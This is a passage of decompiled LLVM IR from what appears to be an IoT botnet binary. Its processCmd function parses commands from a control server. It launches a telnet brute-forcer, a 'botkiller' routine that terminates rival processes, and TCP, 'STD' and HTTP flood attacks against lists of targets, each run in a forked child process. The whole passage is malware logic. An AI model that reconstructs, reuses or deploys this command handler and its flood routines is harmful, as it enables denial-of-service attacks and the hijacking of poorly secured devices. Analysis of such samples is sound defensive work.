  %v1_1000a738 = call i32 @__GI_time(i32 0)
  %v2_1000a74c = icmp slt i32 %v1_1000a738, %v2_1000a748
  br i1 %v2_1000a74c, label %dec_label_pc_1000a764, label %dec_label_pc_1000a754

dec_label_pc_1000a754:                            ; preds = %dec_label_pc_1000a708
  store i32 ptrtoint ([3 x i8]* @global_var_1000a75c.634 to i32), i32* @lr, align 4
  %v1_1000a758 = call i32 @__libc_close(i32 %v3_1000a658)
  %v1_1000a760 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000a764

dec_label_pc_1000a764:                            ; preds = %dec_label_pc_1000a708, %dec_label_pc_1000a754
  br label %dec_label_pc_1000a76c

dec_label_pc_1000a76c:                            ; preds = %dec_label_pc_1000a6fc, %dec_label_pc_1000a764
  %stack_var_-56.0 = phi i32 [ %storemerge1, %dec_label_pc_1000a6fc ], [ 0, %dec_label_pc_1000a764 ]
  %v1_1000a770 = add i32 %stack_var_-56.0, 1
  br label %dec_label_pc_1000a6fc

; uselistorder directives
  uselistorder i32 %v3_1000a6c4, { 1, 0 }
  uselistorder i32 %v1_1000a67c, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a76c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a764, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-64 = alloca i32, align 4
  %v2_1000a7b0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10017b30.45 to i32), i32* @r4, align 4
  %v3_1000a7c0 = inttoptr i32 %v2_1000a7b0 to i8*
  %v4_1000a7c0 = call i32 @__GI_strcoll(i8* %v3_1000a7c0, i32 ptrtoint ([5 x i8]* @global_var_10017b30.45 to i32))
  %v3_1000a7c8 = icmp eq i32 %v4_1000a7c0, 0
  br i1 %v3_1000a7c8, label %dec_label_pc_1000a7d0, label %dec_label_pc_1000a7f0

dec_label_pc_1000a7d0:                            ; preds = %entry
  %v3_1000a7d4 = load i32, i32* @global_var_1002b8f8.44, align 4
  store i32 ptrtoint (i32* @global_var_1000a7ec.637 to i32), i32* @lr, align 4
  %v4_1000a7e8 = call i32 @sockprintf(i32 %v3_1000a7d4, i32 ptrtoint ([6 x i8]* @global_var_10018cf0.636 to i32), i32 268566528)
  br label %dec_label_pc_1000b110

dec_label_pc_1000a7f0:                            ; preds = %entry
  %v2_1000a7f4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10018cf8.638 to i32), i32* @r4, align 4
  %v3_1000a804 = inttoptr i32 %v2_1000a7f4 to i8*
  %v4_1000a804 = call i32 @__GI_strcoll(i8* %v3_1000a804, i32 ptrtoint ([7 x i8]* @global_var_10018cf8.638 to i32))
  %v3_1000a80c = icmp eq i32 %v4_1000a804, 0
  br i1 %v3_1000a80c, label %dec_label_pc_1000a814, label %dec_label_pc_1000a94c

dec_label_pc_1000a814:                            ; preds = %dec_label_pc_1000a7f0
  %v3_1000a818 = icmp eq i32 %arg1, 2
  br i1 %v3_1000a818, label %dec_label_pc_1000a840, label %dec_label_pc_1000a820

dec_label_pc_1000a820:                            ; preds = %dec_label_pc_1000a814
  %v3_1000a824 = load i32, i32* @global_var_1002b8f8.44, align 4
  store i32 ptrtoint (i32* @global_var_1000a83c.640 to i32), i32* @lr, align 4
  %v4_1000a838 = call i32 @sockprintf(i32 %v3_1000a824, i32 ptrtoint ([16 x i8]* @global_var_10018d00.639 to i32), i32 268566528)
  br label %dec_label_pc_1000b110

dec_label_pc_1000a840:                            ; preds = %dec_label_pc_1000a814
  %v1_1000a844 = add i32 %tmp, 4
  %v1_1000a848 = inttoptr i32 %v1_1000a844 to i32*
  %v2_1000a848 = load i32, i32* %v1_1000a848, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10018d10.641 to i32), i32* @r4, align 4
  %v3_1000a858 = inttoptr i32 %v2_1000a848 to i8*
  %v4_1000a858 = call i32 @__GI_strcoll(i8* %v3_1000a858, i32 ptrtoint ([4 x i8]* @global_var_10018d10.641 to i32))
  %v3_1000a860 = icmp eq i32 %v4_1000a858, 0
  br i1 %v3_1000a860, label %dec_label_pc_1000a868, label %dec_label_pc_1000a8b4

dec_label_pc_1000a868:                            ; preds = %dec_label_pc_1000a840
  %v3_1000a86c = load i32, i32* @global_var_1002b928.642, align 4
  %v3_1000a870 = icmp eq i32 %v3_1000a86c, 0
  br i1 %v3_1000a870, label %dec_label_pc_1000b110, label %dec_label_pc_1000a878

dec_label_pc_1000a878:                            ; preds = %dec_label_pc_1000a868
  store i32 268478604, i32* @lr, align 4
  %v2_1000a888 = call i32 @kill(i32 %v3_1000a86c, i32 9)
  %v3_1000a890 = load i32, i32* @global_var_1002b8f8.44, align 4
  store i32 268478632, i32* @lr, align 4
  %v4_1000a8a4 = call i32 @sockprintf(i32 %v3_1000a890, i32 ptrtoint ([13 x i8]* @global_var_10018d14.643 to i32), i32 268566528)
  store i32 0, i32* @global_var_1002b928.642, align 4
  br label %dec_label_pc_1000a8b4

dec_label_pc_1000a8b4:                            ; preds = %dec_label_pc_1000a840, %dec_label_pc_1000a878
  %v2_1000a8bc = load i32, i32* %v1_1000a848, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10018d24.644 to i32), i32* @r4, align 4
  %v3_1000a8cc = inttoptr i32 %v2_1000a8bc to i8*
  %v4_1000a8cc = call i32 @__GI_strcoll(i8* %v3_1000a8cc, i32 ptrtoint ([3 x i8]* @global_var_10018d24.644 to i32))
  %v3_1000a8d4 = icmp eq i32 %v4_1000a8cc, 0
  br i1 %v3_1000a8d4, label %dec_label_pc_1000a8dc, label %dec_label_pc_1000a94c

dec_label_pc_1000a8dc:                            ; preds = %dec_label_pc_1000a8b4
  %v3_1000a8e0 = load i32, i32* @global_var_1002b928.642, align 4
  %v3_1000a8e4 = icmp eq i32 %v3_1000a8e0, 0
  br i1 %v3_1000a8e4, label %dec_label_pc_1000a8ec, label %dec_label_pc_1000b110

dec_label_pc_1000a8ec:                            ; preds = %dec_label_pc_1000a8dc
  store i32 268478704, i32* @lr, align 4
  %v0_1000a8ec = call i32 @__libc_fork()
  %v3_1000a8fc = icmp eq i32 %v0_1000a8ec, 0
  br i1 %v3_1000a8fc, label %dec_label_pc_1000a914, label %dec_label_pc_1000a904

dec_label_pc_1000a904:                            ; preds = %dec_label_pc_1000a8ec
  store i32 %v0_1000a8ec, i32* @global_var_1002b928.642, align 4
  br label %dec_label_pc_1000b110

dec_label_pc_1000a914:                            ; preds = %dec_label_pc_1000a8ec
  %v3_1000a928 = load i32, i32* @global_var_1002b8f8.44, align 4
  store i32 268478784, i32* @lr, align 4
  %v4_1000a93c = call i32 @sockprintf(i32 %v3_1000a928, i32 ptrtoint ([12 x i8]* @global_var_10018d28.645 to i32), i32 268566528)
  %v1_1000a940 = call i32 @Da_Telnet_Bruter(i32 %v4_1000a93c)
  %v1_1000a948 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000a94c

dec_label_pc_1000a94c:                            ; preds = %dec_label_pc_1000a8b4, %dec_label_pc_1000a7f0, %dec_label_pc_1000a914
  %v2_1000a950 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_10018d34.647 to i32), i32* @r4, align 4
  %v3_1000a960 = inttoptr i32 %v2_1000a950 to i8*
  %v4_1000a960 = call i32 @__GI_strcoll(i8* %v3_1000a960, i32 ptrtoint ([8 x i8]* @global_var_10018d34.647 to i32))
  %v3_1000a968 = icmp eq i32 %v4_1000a960, 0
  br i1 %v3_1000a968, label %dec_label_pc_1000a970, label %dec_label_pc_1000a9c8

dec_label_pc_1000a970:                            ; preds = %dec_label_pc_1000a94c
  store i32 268478836, i32* @lr, align 4
  %v0_1000a970 = call i32 @listFork()
  %v3_1000a978 = icmp eq i32 %v0_1000a970, 0
  br i1 %v3_1000a978, label %dec_label_pc_1000a980, label %dec_label_pc_1000a9c8

dec_label_pc_1000a980:                            ; preds = %dec_label_pc_1000a970
  %v3_1000a98c = load i32, i32* @global_var_1002b920.309, align 4
  store i32 %v3_1000a98c, i32* %stack_var_-64, align 4
  store i32 268478880, i32* @lr, align 4
  %v3_1000a99c = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-64, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_1000a9a4 = load i32, i32* @r29, align 4
  store i32 268478908, i32* @lr, align 4
  %v5_1000a9b8 = call i32 @sockprintf(i32 %v0_1000a9a4, i32 ptrtoint ([13 x i8]* @global_var_10018d3c.648 to i32), i32 %v3_1000a99c)
  %v1_1000a9bc = call i32 @botkiller(i32 %v5_1000a9b8)
  %v1_1000a9c4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000a9c8

dec_label_pc_1000a9c8:                            ; preds = %dec_label_pc_1000a970, %dec_label_pc_1000a94c, %dec_label_pc_1000a980
  %v2_1000a9cc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10018d4c.650 to i32), i32* @r4, align 4
  %v3_1000a9dc = inttoptr i32 %v2_1000a9cc to i8*
  %v4_1000a9dc = call i32 @__GI_strcoll(i8* %v3_1000a9dc, i32 ptrtoint ([4 x i8]* @global_var_10018d4c.650 to i32))
  %v3_1000a9e4 = icmp eq i32 %v4_1000a9dc, 0
  br i1 %v3_1000a9e4, label %dec_label_pc_1000a9ec, label %dec_label_pc_1000ac40

dec_label_pc_1000a9ec:                            ; preds = %dec_label_pc_1000a9c8
  %tmp59 = icmp slt i32 %arg1, 6
  br i1 %tmp59, label %dec_label_pc_1000b110, label %dec_label_pc_1000a9f8

dec_label_pc_1000a9f8:                            ; preds = %dec_label_pc_1000a9ec
  %v1_1000a9fc = add i32 %tmp, 12
  %v1_1000aa00 = inttoptr i32 %v1_1000a9fc to i32*
  %v2_1000aa00 = load i32, i32* %v1_1000aa00, align 4
  store i32 268478988, i32* @lr, align 4
  %v2_1000aa08 = call i32 @atol(i32 %v2_1000aa00, i32 %v1_1000a9fc)
  %v4_1000aa14 = icmp eq i32 %v2_1000aa08, -1
  br i1 %v4_1000aa14, label %dec_label_pc_1000b110, label %dec_label_pc_1000aa1c

dec_label_pc_1000aa1c:                            ; preds = %dec_label_pc_1000a9f8
  %v1_1000aa20 = add i32 %tmp, 8
  %v1_1000aa24 = inttoptr i32 %v1_1000aa20 to i32*
  %v2_1000aa24 = load i32, i32* %v1_1000aa24, align 4
  store i32 268479024, i32* @lr, align 4
  %v2_1000aa2c = call i32 @atol(i32 %v2_1000aa24, i32 %v1_1000aa20)
  %v4_1000aa38 = icmp eq i32 %v2_1000aa2c, -1
  br i1 %v4_1000aa38, label %dec_label_pc_1000b110, label %dec_label_pc_1000aa4c

dec_label_pc_1000aa4c:                            ; preds = %dec_label_pc_1000aa1c
  %v1_1000aa50 = add i32 %tmp, 20
  %v1_1000aa54 = inttoptr i32 %v1_1000aa50 to i32*
  %v2_1000aa54 = load i32, i32* %v1_1000aa54, align 4
  store i32 268479072, i32* @lr, align 4
  %v2_1000aa5c = call i32 @atol(i32 %v2_1000aa54, i32 %v1_1000aa50)
  %v1_1000aa64 = icmp slt i32 %v2_1000aa5c, 0
  br i1 %v1_1000aa64, label %dec_label_pc_1000b110, label %dec_label_pc_1000aa6c

dec_label_pc_1000aa6c:                            ; preds = %dec_label_pc_1000aa4c
  %v3_1000aa70 = icmp eq i32 %arg1, 7
  br i1 %v3_1000aa70, label %dec_label_pc_1000aa78, label %dec_label_pc_1000aa9c

dec_label_pc_1000aa78:                            ; preds = %dec_label_pc_1000aa6c
  %v1_1000aa7c = add i32 %tmp, 24
  %v1_1000aa80 = inttoptr i32 %v1_1000aa7c to i32*
  %v2_1000aa80 = load i32, i32* %v1_1000aa80, align 4
  store i32 268479116, i32* @lr, align 4
  %v2_1000aa88 = call i32 @atol(i32 %v2_1000aa80, i32 %v1_1000aa7c)
  %v2_1000aa90 = icmp sgt i32 %v2_1000aa88, 0
  br i1 %v2_1000aa90, label %dec_label_pc_1000aa9c, label %dec_label_pc_1000b110

dec_label_pc_1000aa9c:                            ; preds = %dec_label_pc_1000aa6c, %dec_label_pc_1000aa78
  %v1_1000aaa0 = add i32 %tmp, 4
  %v1_1000aaa4 = inttoptr i32 %v1_1000aaa0 to i32*
  %v2_1000aaa4 = load i32, i32* %v1_1000aaa4, align 4
  %v2_1000aab4 = load i32, i32* %v1_1000aa24, align 4
  store i32 268479168, i32* @lr, align 4
  %v2_1000aabc = call i32 @atol(i32 %v2_1000aab4, i32 %v1_1000aa20)
  %v2_1000aad0 = load i32, i32* %v1_1000aa00, align 4
  store i32 268479196, i32* @lr, align 4
  %v2_1000aad8 = call i32 @atol(i32 %v2_1000aad0, i32 %v1_1000a9fc)
  %v1_1000aae8 = add i32 %tmp, 16
  %v1_1000aaec = inttoptr i32 %v1_1000aae8 to i32*
  %v2_1000aaec = load i32, i32* %v1_1000aaec, align 4
  br i1 %v3_1000aa70, label %dec_label_pc_1000ab00, label %dec_label_pc_1000ab1c

dec_label_pc_1000ab00:                            ; preds = %dec_label_pc_1000aa9c
  %v1_1000ab04 = add i32 %tmp, 24
  %v1_1000ab08 = inttoptr i32 %v1_1000ab04 to i32*
  %v2_1000ab08 = load i32, i32* %v1_1000ab08, align 4
  store i32 268479252, i32* @lr, align 4
  %v2_1000ab10 = call i32 @atol(i32 %v2_1000ab08, i32 %v1_1000ab04)
  br label %dec_label_pc_1000ab5c

dec_label_pc_1000ab1c:                            ; preds = %dec_label_pc_1000aa9c
  br label %dec_label_pc_1000ab5c

dec_label_pc_1000ab5c:                            ; preds = %dec_label_pc_1000ab00, %dec_label_pc_1000ab1c
  %storemerge5 = phi i32 [ 10, %dec_label_pc_1000ab1c ], [ %v2_1000ab10, %dec_label_pc_1000ab00 ]
  %v2_1000ab40 = load i32, i32* %v1_1000aa54, align 4
  store i32 268479308, i32* @lr, align 4
  %v2_1000ab48 = call i32 @atol(i32 %v2_1000ab40, i32 %v1_1000aa50)
  store i32 %v2_1000aaa4, i32* @r3, align 4
  store i32 268479356, i32* @lr, align 4
  %v2_1000ab78 = call i32 @__GI_strchr(i32 %v2_1000aaa4, i32 44)
  %v3_1000ab80 = icmp eq i32 %v2_1000ab78, 0
  br i1 %v3_1000ab80, label %dec_label_pc_1000ac08, label %dec_label_pc_1000ab88

dec_label_pc_1000ab88:                            ; preds = %dec_label_pc_1000ab5c
  store i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32* @r4, align 4
  store i32 268479388, i32* @lr, align 4
  %v3_1000ab98 = call i32 @__GI_strtok(i32 %v2_1000aaa4, i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32 268566528)
  %v3_1000abfc22 = icmp eq i32 %v3_1000ab98, 0
  br i1 %v3_1000abfc22, label %dec_label_pc_1000ac40, label %dec_label_pc_1000aba8

dec_label_pc_1000aba8:                            ; preds = %dec_label_pc_1000ab88, %dec_label_pc_1000abe0
  %storemerge1223 = phi i32 [ %v3_1000abec, %dec_label_pc_1000abe0 ], [ %v3_1000ab98, %dec_label_pc_1000ab88 ]
  store i32 268479404, i32* @lr, align 4
  %v0_1000aba8 = call i32 @listFork()
  %v3_1000abb0 = icmp eq i32 %v0_1000aba8, 0
  br i1 %v3_1000abb0, label %dec_label_pc_1000abb8, label %dec_label_pc_1000abe0

dec_label_pc_1000abb8:                            ; preds = %dec_label_pc_1000aba8
  %v7_1000abd4 = call i32 @SendTCP(i32 %storemerge1223, i32 %v2_1000aabc, i32 %v2_1000aad8, i32 %v2_1000aaec, i32 %v2_1000ab48, i32 %storemerge5, i32 32)
  %v1_1000abdc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000abe0

dec_label_pc_1000abe0:                            ; preds = %dec_label_pc_1000aba8, %dec_label_pc_1000abb8
  store i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32* @r4, align 4
  store i32 268479472, i32* @lr, align 4
  %v3_1000abec = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32 268566528)
  %v3_1000abfc = icmp eq i32 %v3_1000abec, 0
  br i1 %v3_1000abfc, label %dec_label_pc_1000ac40, label %dec_label_pc_1000aba8

dec_label_pc_1000ac08:                            ; preds = %dec_label_pc_1000ab5c
  store i32 268479500, i32* @lr, align 4
  %v0_1000ac08 = call i32 @listFork()
  %v3_1000ac10 = icmp eq i32 %v0_1000ac08, 0
  br i1 %v3_1000ac10, label %dec_label_pc_1000ac18, label %dec_label_pc_1000b110

dec_label_pc_1000ac18:                            ; preds = %dec_label_pc_1000ac08
  %v7_1000ac34 = call i32 @SendTCP(i32 %v2_1000aaa4, i32 %v2_1000aabc, i32 %v2_1000aad8, i32 %v2_1000aaec, i32 %v2_1000ab48, i32 %storemerge5, i32 32)
  %v1_1000ac3c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000ac40

dec_label_pc_1000ac40:                            ; preds = %dec_label_pc_1000abe0, %dec_label_pc_1000ab88, %dec_label_pc_1000a9c8, %dec_label_pc_1000ac18
  %v2_1000ac44 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10018d50.654 to i32), i32* @r4, align 4
  %v3_1000ac54 = inttoptr i32 %v2_1000ac44 to i8*
  %v4_1000ac54 = call i32 @__GI_strcoll(i8* %v3_1000ac54, i32 ptrtoint ([4 x i8]* @global_var_10018d50.654 to i32))
  %v3_1000ac5c = icmp eq i32 %v4_1000ac54, 0
  br i1 %v3_1000ac5c, label %dec_label_pc_1000ac64, label %dec_label_pc_1000adb0

dec_label_pc_1000ac64:                            ; preds = %dec_label_pc_1000ac40
  %tmp60 = icmp slt i32 %arg1, 4
  br i1 %tmp60, label %dec_label_pc_1000b110, label %dec_label_pc_1000ac70

dec_label_pc_1000ac70:                            ; preds = %dec_label_pc_1000ac64
  %v1_1000ac74 = add i32 %tmp, 8
  %v1_1000ac78 = inttoptr i32 %v1_1000ac74 to i32*
  %v2_1000ac78 = load i32, i32* %v1_1000ac78, align 4
  store i32 268479620, i32* @lr, align 4
  %v2_1000ac80 = call i32 @atol(i32 %v2_1000ac78, i32 %v1_1000ac74)
  %tmp61 = icmp slt i32 %v2_1000ac80, 1
  br i1 %tmp61, label %dec_label_pc_1000b110, label %dec_label_pc_1000ac90

dec_label_pc_1000ac90:                            ; preds = %dec_label_pc_1000ac70
  %v1_1000ac94 = add i32 %tmp, 12
  %v1_1000ac98 = inttoptr i32 %v1_1000ac94 to i32*
  %v2_1000ac98 = load i32, i32* %v1_1000ac98, align 4
  store i32 268479652, i32* @lr, align 4
  %v2_1000aca0 = call i32 @atol(i32 %v2_1000ac98, i32 %v1_1000ac94)
  %v2_1000aca8 = icmp sgt i32 %v2_1000aca0, 0
  br i1 %v2_1000aca8, label %dec_label_pc_1000acb4, label %dec_label_pc_1000b110

dec_label_pc_1000acb4:                            ; preds = %dec_label_pc_1000ac90
  %v1_1000acb8 = add i32 %tmp, 4
  %v1_1000acbc = inttoptr i32 %v1_1000acb8 to i32*
  %v2_1000acbc = load i32, i32* %v1_1000acbc, align 4
  %v2_1000accc = load i32, i32* %v1_1000ac78, align 4
  store i32 268479704, i32* @lr, align 4
  %v2_1000acd4 = call i32 @atol(i32 %v2_1000accc, i32 %v1_1000ac74)
  %v2_1000ace8 = load i32, i32* %v1_1000ac98, align 4
  store i32 268479732, i32* @lr, align 4
  %v2_1000acf0 = call i32 @atol(i32 %v2_1000ace8, i32 %v1_1000ac94)
  store i32 %v2_1000acbc, i32* @r3, align 4
  store i32 268479756, i32* @lr, align 4
  %v2_1000ad08 = call i32 @__GI_strchr(i32 %v2_1000acbc, i32 44)
  %v3_1000ad10 = icmp eq i32 %v2_1000ad08, 0
  br i1 %v3_1000ad10, label %dec_label_pc_1000ad88, label %dec_label_pc_1000ad18

dec_label_pc_1000ad18:                            ; preds = %dec_label_pc_1000acb4
  store i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32* @r4, align 4
  store i32 268479788, i32* @lr, align 4
  %v3_1000ad28 = call i32 @__GI_strtok(i32 %v2_1000acbc, i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32 268566528)
  %v3_1000ad7c18 = icmp eq i32 %v3_1000ad28, 0
  br i1 %v3_1000ad7c18, label %dec_label_pc_1000adb0, label %dec_label_pc_1000ad38

dec_label_pc_1000ad38:                            ; preds = %dec_label_pc_1000ad18, %dec_label_pc_1000ad60
  %storemerge1019 = phi i32 [ %v3_1000ad6c, %dec_label_pc_1000ad60 ], [ %v3_1000ad28, %dec_label_pc_1000ad18 ]
  store i32 268479804, i32* @lr, align 4
  %v0_1000ad38 = call i32 @listFork()
  %v3_1000ad40 = icmp eq i32 %v0_1000ad38, 0
  br i1 %v3_1000ad40, label %dec_label_pc_1000ad48, label %dec_label_pc_1000ad60

dec_label_pc_1000ad48:                            ; preds = %dec_label_pc_1000ad38
  %v3_1000ad54 = call i32 @SendSTD(i32 %storemerge1019, i32 %v2_1000acd4, i32 %v2_1000acf0)
  %v1_1000ad5c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000ad60

dec_label_pc_1000ad60:                            ; preds = %dec_label_pc_1000ad38, %dec_label_pc_1000ad48
  store i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32* @r4, align 4
  store i32 268479856, i32* @lr, align 4
  %v3_1000ad6c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32 268566528)
  %v3_1000ad7c = icmp eq i32 %v3_1000ad6c, 0
  br i1 %v3_1000ad7c, label %dec_label_pc_1000adb0, label %dec_label_pc_1000ad38

dec_label_pc_1000ad88:                            ; preds = %dec_label_pc_1000acb4
  store i32 268479884, i32* @lr, align 4
  %v0_1000ad88 = call i32 @listFork()
  %v3_1000ad90 = icmp eq i32 %v0_1000ad88, 0
  br i1 %v3_1000ad90, label %dec_label_pc_1000ad98, label %dec_label_pc_1000b110

dec_label_pc_1000ad98:                            ; preds = %dec_label_pc_1000ad88
  %v3_1000ada4 = call i32 @SendSTD(i32 %v2_1000acbc, i32 %v2_1000acd4, i32 %v2_1000acf0)
  %v1_1000adac = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000adb0

dec_label_pc_1000adb0:                            ; preds = %dec_label_pc_1000ad60, %dec_label_pc_1000ad18, %dec_label_pc_1000ac40, %dec_label_pc_1000ad98
  %v2_1000adb4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10018d54.658 to i32), i32* @r4, align 4
  %v3_1000adc4 = inttoptr i32 %v2_1000adb4 to i8*
  %v4_1000adc4 = call i32 @__GI_strcoll(i8* %v3_1000adc4, i32 ptrtoint ([4 x i8]* @global_var_10018d54.658 to i32))
  %v3_1000adcc = icmp eq i32 %v4_1000adc4, 0
  br i1 %v3_1000adcc, label %dec_label_pc_1000add4, label %dec_label_pc_1000afb4

dec_label_pc_1000add4:                            ; preds = %dec_label_pc_1000adb0
  %tmp62 = icmp slt i32 %arg1, 6
  br i1 %tmp62, label %dec_label_pc_1000b110, label %dec_label_pc_1000ade0

dec_label_pc_1000ade0:                            ; preds = %dec_label_pc_1000add4
  %v1_1000ade4 = add i32 %tmp, 4
  %v1_1000ade8 = inttoptr i32 %v1_1000ade4 to i32*
  %v2_1000ade8 = load i32, i32* %v1_1000ade8, align 4
  store i32 %v2_1000ade8, i32* @r3, align 4
  store i32 268479992, i32* @lr, align 4
  %v2_1000adf4 = call i32 @__GI_strchr(i32 %v2_1000ade8, i32 44)
  %v3_1000adfc = icmp eq i32 %v2_1000adf4, 0
  br i1 %v3_1000adfc, label %dec_label_pc_1000af04, label %dec_label_pc_1000ae04

dec_label_pc_1000ae04:                            ; preds = %dec_label_pc_1000ade0
  %v2_1000ae0c = load i32, i32* %v1_1000ade8, align 4
  store i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32* @r4, align 4
  store i32 268480032, i32* @lr, align 4
  %v3_1000ae1c = call i32 @__GI_strtok(i32 %v2_1000ae0c, i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32 268566528)
  %v3_1000aef815 = icmp eq i32 %v3_1000ae1c, 0
  br i1 %v3_1000aef815, label %dec_label_pc_1000afb4, label %dec_label_pc_1000ae2c.lr.ph

dec_label_pc_1000ae2c.lr.ph:                      ; preds = %dec_label_pc_1000ae04
  %v1_1000ae60 = add i32 %tmp, 12
  %v1_1000ae64 = inttoptr i32 %v1_1000ae60 to i32*
  %v1_1000ae8c = add i32 %tmp, 20
  %v1_1000ae90 = inttoptr i32 %v1_1000ae8c to i32*
  %v1_1000aea4 = add i32 %tmp, 24
  %v1_1000aea8 = inttoptr i32 %v1_1000aea4 to i32*
  br label %dec_label_pc_1000ae2c

dec_label_pc_1000ae2c:                            ; preds = %dec_label_pc_1000ae2c.lr.ph, %dec_label_pc_1000aedc
  store i32 268480048, i32* @lr, align 4
  %v0_1000ae2c = call i32 @listFork()
  %v3_1000ae34 = icmp eq i32 %v0_1000ae2c, 0
  br i1 %v3_1000ae34, label %dec_label_pc_1000ae3c, label %dec_label_pc_1000aedc

dec_label_pc_1000ae3c:                            ; preds = %dec_label_pc_1000ae2c
  %v2_1000ae44 = load i32, i32* %v1_1000ade8, align 4
  store i32 %v2_1000ae44, i32* @r29, align 4
  %v2_1000ae64 = load i32, i32* %v1_1000ae64, align 4
  store i32 268480112, i32* @lr, align 4
  %v2_1000ae6c = call i32 @atol(i32 %v2_1000ae64, i32 %v1_1000ae60)
  %v1_1000ae74 = urem i32 %v2_1000ae6c, 65536
  store i32 %v1_1000ae74, i32* @r27, align 4
  %v2_1000ae90 = load i32, i32* %v1_1000ae90, align 4
  store i32 268480156, i32* @lr, align 4
  %v2_1000ae98 = call i32 @atol(i32 %v2_1000ae90, i32 %v1_1000ae8c)
  %v2_1000aea8 = load i32, i32* %v1_1000aea8, align 4
  store i32 268480180, i32* @lr, align 4
  %v2_1000aeb0 = call i32 @atol(i32 %v2_1000aea8, i32 %v1_1000aea4)
  %v0_1000aeb8 = load i32, i32* @r29, align 4
  %v0_1000aebc = load i32, i32* @r28, align 4
  %v0_1000aec0 = load i32, i32* @r27, align 4
  %v0_1000aec4 = load i32, i32* @r26, align 4
  %v0_1000aec8 = load i32, i32* @r25, align 4
  %v6_1000aed0 = trunc i32 %v0_1000aec0 to i16
  %v7_1000aed0 = call i32 @sendHTTP(i32 %v0_1000aeb8, i32 %v0_1000aebc, i16 %v6_1000aed0, i32 %v0_1000aec4, i32 %v0_1000aec8, i32 %v2_1000aeb0)
  %v1_1000aed8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000aedc

dec_label_pc_1000aedc:                            ; preds = %dec_label_pc_1000ae2c, %dec_label_pc_1000ae3c
  store i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32* @r4, align 4
  store i32 268480236, i32* @lr, align 4
  %v3_1000aee8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32 268566528)
  %v3_1000aef8 = icmp eq i32 %v3_1000aee8, 0
  br i1 %v3_1000aef8, label %dec_label_pc_1000afb4, label %dec_label_pc_1000ae2c

dec_label_pc_1000af04:                            ; preds = %dec_label_pc_1000ade0
  store i32 268480264, i32* @lr, align 4
  %v0_1000af04 = call i32 @listFork()
  %v3_1000af0c = icmp eq i32 %v0_1000af04, 0
  br i1 %v3_1000af0c, label %dec_label_pc_1000af14, label %dec_label_pc_1000b110

dec_label_pc_1000af14:                            ; preds = %dec_label_pc_1000af04
  %v2_1000af1c = load i32, i32* %v1_1000ade8, align 4
  store i32 %v2_1000af1c, i32* @r29, align 4
  %v1_1000af38 = add i32 %tmp, 12
  %v1_1000af3c = inttoptr i32 %v1_1000af38 to i32*
  %v2_1000af3c = load i32, i32* %v1_1000af3c, align 4
  store i32 268480328, i32* @lr, align 4
  %v2_1000af44 = call i32 @atol(i32 %v2_1000af3c, i32 %v1_1000af38)
  %v1_1000af4c = urem i32 %v2_1000af44, 65536
  store i32 %v1_1000af4c, i32* @r27, align 4
  %v1_1000af64 = add i32 %tmp, 20
  %v1_1000af68 = inttoptr i32 %v1_1000af64 to i32*
  %v2_1000af68 = load i32, i32* %v1_1000af68, align 4
  store i32 268480372, i32* @lr, align 4
  %v2_1000af70 = call i32 @atol(i32 %v2_1000af68, i32 %v1_1000af64)
  %v1_1000af7c = add i32 %tmp, 24
  %v1_1000af80 = inttoptr i32 %v1_1000af7c to i32*
  %v2_1000af80 = load i32, i32* %v1_1000af80, align 4
  store i32 268480396, i32* @lr, align 4
  %v2_1000af88 = call i32 @atol(i32 %v2_1000af80, i32 %v1_1000af7c)
  %v0_1000af90 = load i32, i32* @r29, align 4
  %v0_1000af94 = load i32, i32* @r28, align 4
  %v0_1000af98 = load i32, i32* @r27, align 4
  %v0_1000af9c = load i32, i32* @r26, align 4
  %v0_1000afa0 = load i32, i32* @r25, align 4
  %v6_1000afa8 = trunc i32 %v0_1000af98 to i16
  %v7_1000afa8 = call i32 @sendHTTP(i32 %v0_1000af90, i32 %v0_1000af94, i16 %v6_1000afa8, i32 %v0_1000af9c, i32 %v0_1000afa0, i32 %v2_1000af88)
  %v1_1000afb0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000afb4

